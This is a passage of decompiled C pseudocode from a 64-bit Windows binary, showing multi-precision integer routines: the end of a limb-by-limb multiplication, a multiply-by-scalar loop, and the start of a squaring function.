  v703 = v698 + 1;
  if ( !v18 )
    v703 = v698;
  v704 = v703 + v686;
  v705 = (unsigned int)a3[6];
  if ( v704 >= v703 )
    v690 = v672;
  v706 = HIDWORD(v695);
  v707 = HIDWORD(a3[6]);
  v708 = v705 * v706;
  v709 = v707 * v706;
  v710 = v709 + 0x100000000i64;
  v711 = v708 + v707 * v702;
  if ( v711 >= v708 )
    v710 = v709;
  v712 = a2[1];
  v713 = v690 + 1;
  v714 = HIDWORD(v711) + v710;
  v715 = v711 << 32;
  v716 = v714 + 1;
  v717 = v715 + v705 * v701;
  if ( v717 >= v715 )
    v716 = v714;
  v718 = v717 + v700;
  v18 = v718 < v717;
  v719 = (unsigned int)v712;
  v720 = (unsigned int)v712;
  v721 = v716 + 1;
  if ( !v18 )
    v721 = v716;
  v722 = v721 + v704;
  v723 = (unsigned int)a3[7];
  if ( v722 >= v721 )
    v713 = v690;
  v724 = HIDWORD(a3[7]);
  v725 = HIDWORD(v712);
  v726 = v713 + 1;
  v727 = v723 * v725;
  v728 = v724 * v725;
  v729 = v727 + v724 * v720;
  v730 = v728 + 0x100000000i64;
  if ( v729 >= v727 )
    v730 = v728;
  v731 = HIDWORD(v729) + v730;
  v732 = v729 << 32;
  v733 = v731 + 1;
  v734 = v732 + v723 * v719;
  if ( v734 >= v732 )
    v733 = v731;
  v735 = v734 + v718;
  a1[8] = v735;
  v736 = v733 + 1;
  if ( v735 >= v734 )
    v736 = v733;
  v737 = v736 + v722;
  v738 = (unsigned int)a3[7];
  if ( v737 >= v736 )
    v726 = v713;
  v739 = HIDWORD(a3[7]);
  v740 = HIDWORD(a2[2]);
  v741 = v738 * v740;
  v742 = v739 * v740;
  v743 = v741 + v739 * (unsigned int)a2[2];
  v744 = v742 + 0x100000000i64;
  if ( v743 >= v741 )
    v744 = v742;
  v745 = HIDWORD(v743) + v744;
  v746 = v743 << 32;
  v747 = v745 + 1;
  v748 = v746 + v738 * (unsigned int)a2[2];
  if ( v748 >= v746 )
    v747 = v745;
  v749 = v748 + v737;
  v750 = v747 + 1;
  if ( v749 >= v748 )
    v750 = v747;
  v751 = v726 + v750;
  v752 = (unsigned int)a3[6];
  v753 = v726 + v750 < v750;
  v754 = HIDWORD(a3[6]);
  v755 = v753 + 1;
  v756 = HIDWORD(a2[3]);
  v757 = v754 * v756;
  v758 = v752 * v756;
  v759 = v757 + 0x100000000i64;
  v760 = v758 + v754 * (unsigned int)a2[3];
  if ( v760 >= v758 )
    v759 = v757;
  v761 = a2[4];
  v762 = HIDWORD(v760) + v759;
  v763 = v760 << 32;
  v764 = v762 + 1;
  v765 = v763 + v752 * (unsigned int)a2[3];
  if ( v765 >= v763 )
    v764 = v762;
  v766 = v765 + v749;
  v18 = v766 < v765;
  v767 = (unsigned int)v761;
  v768 = (unsigned int)v761;
  v769 = v764 + 1;
  if ( !v18 )
    v769 = v764;
  v770 = v769 + v751;
  v771 = (unsigned int)a3[5];
  if ( v770 >= v769 )
    v755 = v753;
  v772 = HIDWORD(a3[5]);
  v773 = v755 + 1;
  v774 = HIDWORD(v761);
  v775 = v772 * HIDWORD(v761);
  v776 = v771 * v774;
  v777 = v775 + 0x100000000i64;
  v778 = v776 + v772 * v768;
  if ( v778 >= v776 )
    v777 = v775;
  v779 = a2[5];
  v780 = HIDWORD(v778) + v777;
  v781 = v778 << 32;
  v782 = v780 + 1;
  v783 = v781 + v771 * v767;
  if ( v783 >= v781 )
    v782 = v780;
  v784 = v783 + v766;
  v18 = v784 < v783;
  v785 = (unsigned int)v779;
  v786 = (unsigned int)v779;
  v787 = v782 + 1;
  if ( !v18 )
    v787 = v782;
  v788 = v787 + v770;
  v789 = (unsigned int)a3[4];
  if ( v788 >= v787 )
    v773 = v755;
  v790 = HIDWORD(v779);
  v791 = HIDWORD(a3[4]);
  v792 = v789 * v790;
  v793 = v791 * v790;
  v794 = v792 + v791 * v786;
  v795 = v773 + 1;
  v796 = v793 + 0x100000000i64;
  if ( v794 >= v792 )
    v796 = v793;
  v797 = a2[6];
  v798 = HIDWORD(v794) + v796;
  v799 = v794 << 32;
  v800 = v798 + 1;
  v801 = v799 + v789 * v785;
  if ( v801 >= v799 )
    v800 = v798;
  v802 = v801 + v784;
  v18 = v802 < v801;
  v803 = (unsigned int)v797;
  v804 = (unsigned int)v797;
  v805 = v800 + 1;
  if ( !v18 )
    v805 = v800;
  v806 = v805 + v788;
  v807 = (unsigned int)a3[3];
  if ( v806 >= v805 )
    v795 = v773;
  v808 = HIDWORD(a3[3]);
  v809 = HIDWORD(v797);
  v810 = v795 + 1;
  v811 = v807 * v809;
  v812 = v808 * v809;
  v813 = v811 + v808 * v804;
  v814 = v812 + 0x100000000i64;
  if ( v813 >= v811 )
    v814 = v812;
  v815 = a2[7];
  v816 = HIDWORD(v813) + v814;
  v817 = v813 << 32;
  v818 = v816 + 1;
  v819 = v817 + v807 * v803;
  if ( v819 >= v817 )
    v818 = v816;
  v820 = v819 + v802;
  v18 = v820 < v819;
  v821 = (unsigned int)v815;
  v822 = (unsigned int)v815;
  v823 = v818 + 1;
  if ( !v18 )
    v823 = v818;
  v824 = v823 + v806;
  v825 = (unsigned int)a3[2];
  if ( v824 >= v823 )
    v810 = v795;
  v826 = HIDWORD(a3[2]);
  v827 = HIDWORD(v815);
  v828 = v825 * v827;
  v829 = v826 * v827;
  v830 = v828 + v826 * v822;
  v831 = v829 + 0x100000000i64;
  if ( v830 >= v828 )
    v831 = v829;
  v832 = HIDWORD(v830) + v831;
  v833 = v830 << 32;
  v834 = v832 + 1;
  v835 = v833 + v825 * v821;
  if ( v835 >= v833 )
    v834 = v832;
  v836 = v835 + v820;
  v837 = v834 + 1;
  a1[9] = v836;
  v838 = a2[7];
  v839 = v810 + 1;
  if ( v836 >= v835 )
    v837 = v834;
  v840 = (unsigned int)v838;
  v841 = v837 + v824;
  v842 = (unsigned int)a3[3];
  v843 = (unsigned int)v838;
  if ( v841 >= v837 )
    v839 = v810;
  v844 = HIDWORD(a3[3]);
  v845 = HIDWORD(v838);
  v846 = v844 * HIDWORD(v838);
  v847 = v842 * v845;
  v848 = v846 + 0x100000000i64;
  v849 = v847 + v844 * v843;
  if ( v849 >= v847 )
    v848 = v846;
  v850 = a2[6];
  v851 = HIDWORD(v849) + v848;
  v852 = v849 << 32;
  v853 = v851 + 1;
  v854 = v852 + v842 * v840;
  if ( v854 >= v852 )
    v853 = v851;
  v855 = v854 + v841;
  v18 = v855 < v854;
  v856 = (unsigned int)v850;
  v857 = (unsigned int)v850;
  v858 = v853 + 1;
  if ( !v18 )
    v858 = v853;
  v859 = (unsigned int)a3[4];
  v860 = v858 + v839;
  v861 = v858 + v839 < v858;
  v862 = HIDWORD(a3[4]);
  v863 = v861 + 1;
  v864 = HIDWORD(v850);
  v865 = v862 * HIDWORD(v850);
  v866 = v859 * v864;
  v867 = v865 + 0x100000000i64;
  v868 = v866 + v862 * v857;
  if ( v868 >= v866 )
    v867 = v865;
  v869 = a2[5];
  v870 = HIDWORD(v868) + v867;
  v871 = v868 << 32;
  v872 = v870 + 1;
  v873 = v871 + v859 * v856;
  if ( v873 >= v871 )
    v872 = v870;
  v874 = v873 + v855;
  v18 = v874 < v873;
  v875 = (unsigned int)v869;
  v876 = v872 + 1;
  if ( !v18 )
    v876 = v872;
  v877 = v876 + v860;
  v878 = (unsigned int)a3[5];
  if ( v877 >= v876 )
    v863 = v861;
  v879 = HIDWORD(v869);
  v880 = HIDWORD(a3[5]);
  v881 = v878 * v879;
  v882 = v880 * v879;
  v883 = v863 + 1;
  v884 = v881 + v880 * (unsigned int)v875;
  v885 = v882 + 0x100000000i64;
  if ( v884 >= v881 )
    v885 = v882;
  v886 = a2[4];
  v887 = HIDWORD(v884) + v885;
  v888 = v884 << 32;
  v889 = v887 + 1;
  v890 = v888 + v878 * v875;
  if ( v890 >= v888 )
    v889 = v887;
  v891 = v890 + v874;
  v18 = v891 < v890;
  v892 = (unsigned int)v886;
  v893 = (unsigned int)v886;
  v894 = v889 + 1;
  if ( !v18 )
    v894 = v889;
  v895 = v894 + v877;
  v896 = (unsigned int)a3[6];
  if ( v895 >= v894 )
    v883 = v863;
  v897 = HIDWORD(a3[6]);
  v898 = HIDWORD(v886);
  v899 = v883 + 1;
  v900 = v896 * v898;
  v901 = v897 * v898;
  v902 = v900 + v897 * v893;
  v903 = v901 + 0x100000000i64;
  if ( v902 >= v900 )
    v903 = v901;
  v904 = a2[3];
  v905 = HIDWORD(v902) + v903;
  v906 = v902 << 32;
  v907 = v905 + 1;
  v908 = v906 + v896 * v892;
  if ( v908 >= v906 )
    v907 = v905;
  v909 = v908 + v891;
  v18 = v909 < v908;
  v910 = (unsigned int)v904;
  v911 = (unsigned int)v904;
  v912 = v907 + 1;
  if ( !v18 )
    v912 = v907;
  v913 = v912 + v895;
  v914 = (unsigned int)a3[7];
  if ( v913 >= v912 )
    v899 = v883;
  v915 = HIDWORD(a3[7]);
  v916 = HIDWORD(v904);
  v917 = v914 * v916;
  v918 = v915 * v916;
  v919 = v917 + v915 * v911;
  v920 = v918 + 0x100000000i64;
  if ( v919 >= v917 )
    v920 = v918;
  v921 = HIDWORD(v919) + v920;
  v922 = v919 << 32;
  v923 = v921 + 1;
  v924 = v922 + v914 * v910;
  v925 = v899 + 1;
  if ( v924 >= v922 )
    v923 = v921;
  v926 = v924 + v909;
  a1[10] = v926;
  v927 = v923 + 1;
  if ( v926 >= v924 )
    v927 = v923;
  v928 = v927 + v913;
  v929 = (unsigned int)a3[7];
  if ( v928 >= v927 )
    v925 = v899;
  v930 = HIDWORD(a3[7]);
  v931 = HIDWORD(a2[4]);
  v932 = v929 * v931;
  v933 = v930 * v931;
  v934 = v932 + v930 * (unsigned int)a2[4];
  v935 = v933 + 0x100000000i64;
  if ( v934 >= v932 )
    v935 = v933;
  v936 = a2[5];
  v937 = HIDWORD(v934) + v935;
  v938 = v934 << 32;
  v939 = v937 + 1;
  v940 = v938 + v929 * (unsigned int)a2[4];
  if ( v940 >= v938 )
    v939 = v937;
  v941 = v940 + v928;
  v18 = v941 < v940;
  v942 = (unsigned int)v936;
  v943 = (unsigned int)v936;
  v944 = v939 + 1;
  if ( !v18 )
    v944 = v939;
  v945 = (unsigned int)a3[6];
  v946 = v944 + v925;
  v947 = v944 + v925 < v944;
  v948 = HIDWORD(a3[6]);
  v949 = HIDWORD(v936);
  v950 = v947 + 1;
  v951 = v945 * v949;
  v952 = v948 * v949;
  v953 = v951 + v948 * v943;
  v954 = v952 + 0x100000000i64;
  if ( v953 >= v951 )
    v954 = v952;
  v955 = a2[6];
  v956 = HIDWORD(v953) + v954;
  v957 = v953 << 32;
  v958 = v956 + 1;
  v959 = v957 + v945 * v942;
  if ( v959 >= v957 )
    v958 = v956;
  v960 = v959 + v941;
  v961 = v958 + 1;
  if ( v960 >= v959 )
    v961 = v958;
  v962 = v961 + v946;
  v963 = (unsigned int)a3[5];
  if ( v962 >= v961 )
    v950 = v947;
  v964 = HIDWORD(a3[5]);
  v965 = (unsigned int)v955;
  v966 = v950 + 1;
  v967 = HIDWORD(v955);
  v968 = v963 * v967;
  v969 = v964 * v967;
  v970 = v968 + v964 * (unsigned int)v965;
  v971 = v969 + 0x100000000i64;
  if ( v970 >= v968 )
    v971 = v969;
  v972 = a2[7];
  v973 = HIDWORD(v970) + v971;
  v974 = v970 << 32;
  v975 = v973 + 1;
  v976 = v974 + v963 * v965;
  if ( v976 >= v974 )
    v975 = v973;
  v977 = v976 + v960;
  v18 = v977 < v976;
  v978 = (unsigned int)v972;
  v979 = (unsigned int)v972;
  v980 = v975 + 1;
  if ( !v18 )
    v980 = v975;
  v981 = v980 + v962;
  v982 = (unsigned int)a3[4];
  if ( v981 >= v980 )
    v966 = v950;
  v983 = HIDWORD(a3[4]);
  v984 = HIDWORD(v972);
  v985 = v966 + 1;
  v986 = v982 * v984;
  v987 = v983 * v984;
  v988 = v986 + v983 * v979;
  v989 = v987 + 0x100000000i64;
  if ( v988 >= v986 )
    v989 = v987;
  v990 = HIDWORD(v988) + v989;
  v991 = v988 << 32;
  v992 = v990 + 1;
  v993 = v991 + v982 * v978;
  if ( v993 >= v991 )
    v992 = v990;
  v994 = v993 + v977;
  a1[11] = v994;
  v995 = v992 + 1;
  if ( v994 >= v993 )
    v995 = v992;
  v996 = v995 + v981;
  v997 = (unsigned int)a3[5];
  if ( v996 >= v995 )
    v985 = v966;
  v998 = HIDWORD(a2[7]);
  v999 = HIDWORD(a3[5]);
  v1000 = v997 * v998;
  v1001 = v999 * v998;
  v1002 = v1001 + 0x100000000i64;
  v1003 = v1000 + v999 * (unsigned int)a2[7];
  if ( v1003 >= v1000 )
    v1002 = v1001;
  v1004 = HIDWORD(v1003) + v1002;
  v1005 = a2[6];
  v1006 = v1003 << 32;
  v1007 = v1004 + 1;
  v1008 = v1006 + v997 * (unsigned int)a2[7];
  if ( v1008 >= v1006 )
    v1007 = v1004;
  v1009 = v1008 + v996;
  v18 = v1009 < v1008;
  v1010 = (unsigned int)v1005;
  v1011 = (unsigned int)v1005;
  v1012 = v1007 + 1;
  if ( !v18 )
    v1012 = v1007;
  v1013 = (unsigned int)a3[6];
  v1014 = v1012 + v985;
  v1015 = v1012 + v985 < v1012;
  v1016 = HIDWORD(a3[6]);
  v1017 = HIDWORD(v1005);
  v1018 = v1015 + 1;
  v1019 = v1013 * v1017;
  v1020 = v1016 * v1017;
  v1021 = v1019 + v1016 * v1011;
  v1022 = v1020 + 0x100000000i64;
  if ( v1021 >= v1019 )
    v1022 = v1020;
  v1023 = a2[5];
  v1024 = HIDWORD(v1021) + v1022;
  v1025 = v1021 << 32;
  v1026 = v1024 + 1;
  v1027 = v1025 + v1013 * v1010;
  if ( v1027 >= v1025 )
    v1026 = v1024;
  v1028 = v1027 + v1009;
  v18 = v1028 < v1027;
  v1029 = (unsigned int)v1023;
  v1030 = (unsigned int)v1023;
  v1031 = v1026 + 1;
  if ( !v18 )
    v1031 = v1026;
  v1032 = v1031 + v1014;
  v1033 = (unsigned int)a3[7];
  if ( v1032 >= v1031 )
    v1018 = v1015;
  v1034 = HIDWORD(a3[7]);
  v1035 = HIDWORD(v1023);
  v1036 = v1018 + 1;
  v1037 = v1033 * v1035;
  v1038 = v1034 * v1035;
  v1039 = v1037 + v1034 * v1030;
  v1040 = v1038 + 0x100000000i64;
  if ( v1039 >= v1037 )
    v1040 = v1038;
  v1041 = HIDWORD(v1039) + v1040;
  v1042 = v1039 << 32;
  v1043 = v1041 + 1;
  v1044 = v1042 + v1033 * v1029;
  if ( v1044 >= v1042 )
    v1043 = v1041;
  v1045 = v1044 + v1028;
  v1046 = v1043 + 1;
  if ( v1045 >= v1044 )
    v1046 = v1043;
  v1047 = v1046 + v1032;
  if ( v1047 >= v1046 )
    v1036 = v1018;
  a1[12] = v1045;
  v1048 = (unsigned int)a3[7];
  v1049 = HIDWORD(a3[7]);
  v1050 = HIDWORD(a2[6]);
  v1051 = v1049 * v1050;
  v1052 = v1048 * v1050;
  v1053 = v1051 + 0x100000000i64;
  v1054 = v1052 + v1049 * (unsigned int)a2[6];
  if ( v1054 >= v1052 )
    v1053 = v1051;
  v1055 = a2[7];
  v1056 = HIDWORD(v1054) + v1053;
  v1057 = v1054 << 32;
  v1058 = v1056 + 1;
  v1059 = v1057 + v1048 * (unsigned int)a2[6];
  if ( v1059 >= v1057 )
    v1058 = v1056;
  v1060 = v1059 + v1047;
  v18 = v1060 < v1059;
  v1061 = (unsigned int)v1055;
  v1062 = (unsigned int)v1055;
  v1063 = v1058 + 1;
  if ( !v18 )
    v1063 = v1058;
  v1064 = v1063 + v1036;
  v1065 = (unsigned int)a3[6];
  v1066 = v1064 < v1063;
  v1067 = HIDWORD(a3[6]);
  v1068 = v1066 + 1;
  v1069 = HIDWORD(v1055);
  v1070 = v1067 * HIDWORD(v1055);
  v1071 = v1065 * v1069;
  v1072 = v1070 + 0x100000000i64;
  v1073 = v1071 + v1067 * v1062;
  if ( v1073 >= v1071 )
    v1072 = v1070;
  v1074 = HIDWORD(v1073) + v1072;
  v1075 = v1073 << 32;
  v1076 = v1074 + 1;
  v1077 = v1075 + v1065 * v1061;
  if ( v1077 >= v1075 )
    v1076 = v1074;
  v1078 = v1077 + v1060;
  a1[13] = v1078;
  v1079 = v1076 + 1;
  if ( v1078 >= v1077 )
    v1079 = v1076;
  v1080 = v1079 + v1064;
  v1081 = (unsigned int)a3[7];
  if ( v1080 >= v1079 )
    v1068 = v1066;
  v1082 = HIDWORD(a2[7]);
  v1083 = HIDWORD(a3[7]);
  v1084 = v1081 * v1082;
  v1085 = v1083 * v1082;
  v1086 = v1084 + v1083 * (unsigned int)a2[7];
  v1087 = v1085 + 0x100000000i64;
  if ( v1086 >= v1084 )
    v1087 = v1085;
  v1088 = HIDWORD(v1086) + v1087;
  v1089 = v1086 << 32;
  v1090 = v1088 + 1;
  v1091 = v1089 + v1081 * (unsigned int)a2[7];
  if ( v1091 >= v1089 )
    v1090 = v1088;
  v1092 = v1091 + v1080;
  a1[14] = v1092;
  v1093 = v1090 + 1;
  if ( v1092 >= v1091 )
    v1093 = v1090;
  result = v1068 + v1093;
  a1[15] = result;
  return result;
}

//----- (0000000140073520) ----------------------------------------------------
unsigned __int64 __fastcall sub_140073520(char *a1, char *a2, int a3, unsigned __int64 a4)
{
  unsigned __int64 result; // rax
  int v5; // esi
  __int64 v8; // rbp
  unsigned __int64 v9; // rdi
  unsigned __int64 v10; // rcx
  unsigned __int64 v11; // r9
  __int64 v12; // r8
  __int64 v13; // r8
  unsigned __int64 v14; // r9
  __int64 v15; // rdx
  unsigned __int64 v16; // r10
  bool v17; // cf
  __int64 v18; // r9
  unsigned __int64 v19; // r10
  __int64 v20; // rcx
  unsigned __int64 v21; // rax
  __int64 v22; // rcx
  unsigned __int64 v23; // r8
  __int64 v24; // rdx
  unsigned __int64 v25; // rdx
  unsigned __int64 v26; // r8
  unsigned __int64 v27; // rcx
  unsigned __int64 v28; // r9
  unsigned __int64 v29; // r11
  unsigned __int64 v30; // rax
  unsigned __int64 v31; // r8
  __int64 v32; // rdx
  __int64 v33; // rdx
  unsigned __int64 v34; // r8
  __int64 v35; // rcx
  unsigned __int64 v36; // r9
  unsigned __int64 v37; // r10
  __int64 v38; // r9
  __int64 v39; // rdx
  unsigned __int64 v40; // rax
  __int64 v41; // rdx
  __int64 v42; // rcx
  unsigned __int64 v43; // r8
  unsigned __int64 v44; // rcx
  unsigned __int64 v45; // r8
  unsigned __int64 v46; // rdx
  unsigned __int64 v47; // r9
  signed __int64 v48; // r14
  unsigned __int64 v49; // r8
  __int64 v50; // r10
  unsigned __int64 v51; // rcx
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // rcx
  unsigned __int64 v54; // rdx
  unsigned __int64 v55; // r9
  unsigned __int64 v56; // rdx
  unsigned __int64 v57; // r9
  unsigned __int64 v58; // r8
  unsigned __int64 v59; // r10

  result = 0i64;
  v5 = a3;
  if ( a3 > 0 )
  {
    v8 = (unsigned int)a4;
    v9 = HIDWORD(a4);
    if ( (a3 & 0xFFFFFFFC) != 0 )
    {
      do
      {
        v10 = v8 * HIDWORD(*(_QWORD *)a2);
        v11 = v10 + v9 * (unsigned int)*(_QWORD *)a2;
        v12 = v9 * HIDWORD(*(_QWORD *)a2) + 0x100000000i64;
        if ( v11 >= v10 )
          v12 = v9 * HIDWORD(*(_QWORD *)a2);
        v13 = HIDWORD(v11) + v12;
        v14 = v11 << 32;
        v15 = v13 + 1;
        v16 = v14 + v8 * (unsigned int)*(_QWORD *)a2;
        if ( v16 >= v14 )
          v15 = v13;
        v17 = v16 + result < result;
        *(_QWORD *)a1 = v16 + result;
        v18 = (unsigned int)*((_QWORD *)a2 + 1);
        v19 = v15 + 1;
        if ( !v17 )
          v19 = v15;
        v20 = HIDWORD(*((_QWORD *)a2 + 1));
        v21 = v8 * v20;
        v22 = v9 * v20;
        v23 = v21 + v9 * (unsigned int)v18;
        v24 = v22 + 0x100000000i64;
        if ( v23 >= v21 )
          v24 = v22;
        v25 = HIDWORD(v23) + v24;
        v26 = v23 << 32;
        v27 = v25 + 1;
        v28 = v26 + v8 * v18;
        if ( v28 >= v26 )
          v27 = v25;
        *((_QWORD *)a1 + 1) = v28 + v19;
        v29 = v27 + 1;
        if ( v28 + v19 >= v19 )
          v29 = v27;
        v30 = v8 * HIDWORD(*((_QWORD *)a2 + 2));
        v31 = v30 + v9 * (unsigned int)*((_QWORD *)a2 + 2);
        v32 = v9 * HIDWORD(*((_QWORD *)a2 + 2)) + 0x100000000i64;
        if ( v31 >= v30 )
          v32 = v9 * HIDWORD(*((_QWORD *)a2 + 2));
        v33 = HIDWORD(v31) + v32;
        v34 = v31 << 32;
        v35 = v33 + 1;
        v36 = v34 + v8 * (unsigned int)*((_QWORD *)a2 + 2);
        if ( v36 >= v34 )
          v35 = v33;
        v17 = v36 + v29 < v29;
        *((_QWORD *)a1 + 2) = v36 + v29;
        v37 = v35 + 1;
        v38 = (unsigned int)*((_QWORD *)a2 + 3);
        if ( !v17 )
          v37 = v35;
        v39 = HIDWORD(*((_QWORD *)a2 + 3));
        v40 = v8 * v39;
        v41 = v9 * v39;
        v42 = v41 + 0x100000000i64;
        v43 = v40 + v9 * (unsigned int)v38;
        if ( v43 >= v40 )
          v42 = v41;
        v44 = HIDWORD(v43) + v42;
        v45 = v43 << 32;
        v46 = v44 + 1;
        v47 = v45 + v8 * v38;
        if ( v47 >= v45 )
          v46 = v44;
        *((_QWORD *)a1 + 3) = v47 + v37;
        result = v46 + 1;
        if ( v47 + v37 >= v37 )
          result = v46;
        a2 += 32;
        a1 += 32;
        v5 -= 4;
      }
      while ( (v5 & 0xFFFFFFFC) != 0 );
    }
    if ( v5 )
    {
      v48 = a1 - a2;
      do
      {
        v49 = *(_QWORD *)a2;
        a2 += 8;
        v50 = (unsigned int)v49;
        v51 = HIDWORD(v49);
        v52 = v9 * HIDWORD(v49);
        v53 = v8 * v51;
        v54 = v52 + 0x100000000i64;
        v55 = v53 + v9 * (unsigned int)v50;
        if ( v55 >= v53 )
          v54 = v52;
        v56 = HIDWORD(v55) + v54;
        v57 = v55 << 32;
        v58 = v56 + 1;
        v59 = v57 + v8 * v50;
        if ( v59 >= v57 )
          v58 = v56;
        v17 = v59 + result < result;
        *(_QWORD *)&a2[v48 - 8] = v59 + result;
        result = v58 + 1;
        if ( !v17 )
          result = v58;
        --v5;
      }
      while ( v5 );
    }
  }
  return result;
}

//----- (0000000140073790) ----------------------------------------------------
unsigned __int64 __fastcall sub_140073790(unsigned __int64 *a1, unsigned __int64 *a2)
{
  unsigned __int64 v4; // r9
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // r10
  unsigned __int64 v8; // rcx
  unsigned __int64 v9; // rbx
  unsigned __int64 v10; // rdx
  __int64 v11; // r9
  unsigned __int64 v12; // rcx
  __int64 v13; // r10
  __int64 v14; // r8
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rdx
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rcx
  unsigned __int64 v19; // r8
  bool v20; // cf
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // r8
  unsigned __int64 v23; // rcx
  unsigned __int64 v24; // rdx
  unsigned __int64 v25; // r10
  unsigned __int64 v26; // r8
  unsigned __int64 v27; // rax
  __int64 v28; // rbp
  unsigned __int64 v29; // rdi
  unsigned __int64 v30; // rbx
  __int64 v31; // r9
  _BOOL8 v32; // rsi
  unsigned __int64 v33; // r8
  unsigned __int64 v34; // rax
  unsigned __int64 v35; // r8
  unsigned __int64 v36; // r9
  unsigned __int64 v37; // rcx
  unsigned __int64 v38; // rbx
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // rsi
  __int64 v41; // r9
  _BOOL8 v42; // r11
  unsigned __int64 v43; // rcx
  __int64 v44; // r8
  unsigned __int64 v45; // rax
  __int64 v46; // rdx
  unsigned __int64 v47; // rax
  __int64 v48; // rcx
  unsigned __int64 v49; // r8
  unsigned __int64 v50; // rcx
  unsigned __int64 v51; // r8
  unsigned __int64 v52; // rdx
  unsigned __int64 v53; // r10
  unsigned __int64 v54; // rbx
  _BOOL8 v55; // rcx
  unsigned __int64 v56; // r8
  unsigned __int64 v57; // rax
  unsigned __int64 v58; // rsi
  unsigned __int64 v59; // rbx
  unsigned __int64 v60; // rdx
  unsigned __int64 v61; // rsi
  _BOOL8 v62; // rdi
  __int64 v63; // r9
  unsigned __int64 v64; // rax
  unsigned __int64 v65; // rcx
  __int64 v66; // r8
  unsigned __int64 v67; // rdx
  unsigned __int64 v68; // rax
  unsigned __int64 v69; // rcx
  unsigned __int64 v70; // r8
  unsigned __int64 v71; // rcx
  unsigned __int64 v72; // r8
  unsigned __int64 v73; // rdx
  unsigned __int64 v74; // r10
  unsigned __int64 v75; // rsi
  __int64 v76; // rcx
  unsigned __int64 v77; // r8
  unsigned __int64 v78; // rax
  unsigned __int64 v79; // rdi
  unsigned __int64 v80; // rsi
  __int64 v81; // r11
  unsigned __int64 v82; // rdi
  unsigned __int64 v83; // rdx
  __int64 v84; // r9
  unsigned __int64 v85; // rax
  unsigned __int64 v86; // rcx
  __int64 v87; // rdx
  unsigned __int64 v88; // r8
  __int64 v89; // rcx
  unsigned __int64 v90; // rcx
  unsigned __int64 v91; // r8
  unsigned __int64 v92; // rdx
  unsigned __int64 v93; // r10
  unsigned __int64 v94; // rsi
  __int64 v95; // rcx
  unsigned __int64 v96; // r8
  unsigned __int64 v97; // rax
  unsigned __int64 v98; // rdi
  unsigned __int64 v99; // rsi
  __int64 v100; // r11
  unsigned __int64 v101; // rdi
  __int64 v102; // rbx
  __int64 v103; // r9
  unsigned __int64 v104; // r8
  unsigned __int64 v105; // rax
  unsigned __int64 v106; // r8
  unsigned __int64 v107; // r9
  unsigned __int64 v108; // rcx
  unsigned __int64 v109; // rdx
  __int64 v110; // r10
  unsigned __int64 v111; // rdi
  __int64 v112; // r8
  unsigned __int64 v113; // rax
  unsigned __int64 v114; // rbx
  __int64 v115; // r9
  unsigned __int64 v116; // rdx
  unsigned __int64 v117; // rcx
  unsigned __int64 v118; // rax
  __int64 v119; // rdx
  unsigned __int64 v120; // r8
  __int64 v121; // rcx
  unsigned __int64 v122; // rcx
  unsigned __int64 v123; // r8
  unsigned __int64 v124; // rdx
  unsigned __int64 v125; // r10
  unsigned __int64 v126; // rdi
  __int64 v127; // rcx
  unsigned __int64 v128; // r8
  unsigned __int64 v129; // rax
  unsigned __int64 v130; // rbx
  unsigned __int64 v131; // rdi
  unsigned __int64 v132; // rbx
  __int64 v133; // r11
  unsigned __int64 v134; // rdx
  __int64 v135; // r9
  unsigned __int64 v136; // rax
  unsigned __int64 v137; // rcx
  __int64 v138; // rdx
  unsigned __int64 v139; // r8
  __int64 v140; // rcx
  unsigned __int64 v141; // rcx
  unsigned __int64 v142; // r8
  unsigned __int64 v143; // rdx
  unsigned __int64 v144; // r10
  unsigned __int64 v145; // rbx
  unsigned __int64 v146; // rcx
  unsigned __int64 v147; // rax
  unsigned __int64 v148; // r11
  unsigned __int64 v149; // rbx
  unsigned __int64 v150; // r8
  __int64 v151; // r9
  __int64 v152; // rdx
  __int64 v153; // r10
  unsigned __int64 v154; // r11
  unsigned __int64 v155; // r8
  unsigned __int64 v156; // rax
  unsigned __int64 v157; // rdx
  unsigned __int64 v158; // r8
  unsigned __int64 v159; // r9
  unsigned __int64 v160; // rcx
  unsigned __int64 v161; // r11
  unsigned __int64 v162; // rax
  unsigned __int64 result; // rax

  v4 = HIDWORD(*a2);
  v5 = v4 * (unsigned int)*a2;
  v6 = (v5 >> 31) + v4 * v4;
  v7 = (v5 << 33) + (unsigned int)*a2 * (unsigned __int64)(unsigned int)*a2;
  *a1 = v7;
  v8 = *a2;
  v9 = v6 + 1;
  v10 = a2[1];
  if ( v7 >= v5 << 33 )
    v9 = v6;
  v11 = (unsigned int)v8;
  v12 = HIDWORD(v8);
  v13 = (unsigned int)v10;
  v14 = v12 * (unsigned int)v10;
  v15 = HIDWORD(v10);
  v16 = v12 * HIDWORD(v10);
  v17 = v11 * v15;
  v18 = v16 + 0x100000000i64;
  v19 = v17 + v14;
  v20 = v19 < v17;
  v21 = v19;
  if ( !v20 )
    v18 = v16;
  v22 = v19 << 32;
  v23 = HIDWORD(v21) + v18;
  v24 = v23 + 1;
  v25 = v22 + v11 * v13;
  if ( v25 >= v22 )
    v24 = v23;
  v26 = v24 + 1;
  v27 = v24 + 1;
  if ( v25 + v9 >= v25 )
    v27 = v24;
  v28 = 0i64;
  v29 = v25 + v25 + v9;
  a1[1] = v29;
  if ( v29 >= v25 )
    v26 = v24;
  v30 = v26 + v27;
  v31 = (unsigned int)a2[1];
  v32 = v26 + v27 < v26;
  v33 = HIDWORD(a2[1]);
  v34 = v33 * (unsigned int)v31;
  v35 = (v34 >> 31) + v33 * v33;
  v36 = (v34 << 33) + v31 * v31;
  v37 = v35 + 1;
  if ( v36 >= v34 << 33 )
    v37 = v35;
  v38 = v36 + v30;
  v39 = v37 + 1;
  if ( v38 >= v36 )
    v39 = v37;
  v40 = v39 + v32;
  v41 = (unsigned int)*a2;
  v42 = v40 < v39;
  v43 = HIDWORD(*a2);
  v44 = v43 * (unsigned int)a2[2];
  v45 = HIDWORD(a2[2]);
  v46 = v43 * v45;
  v47 = v41 * v45;
  v48 = v46 + 0x100000000i64;
  v49 = v47 + v44;
  if ( v49 >= v47 )
    v48 = v46;
  v50 = HIDWORD(v49) + v48;
  v51 = v49 << 32;
  v52 = v50 + 1;
  v53 = v51 + v41 * (unsigned int)a2[2];
  if ( v53 >= v51 )
    v52 = v50;
  v54 = v53 + v38;
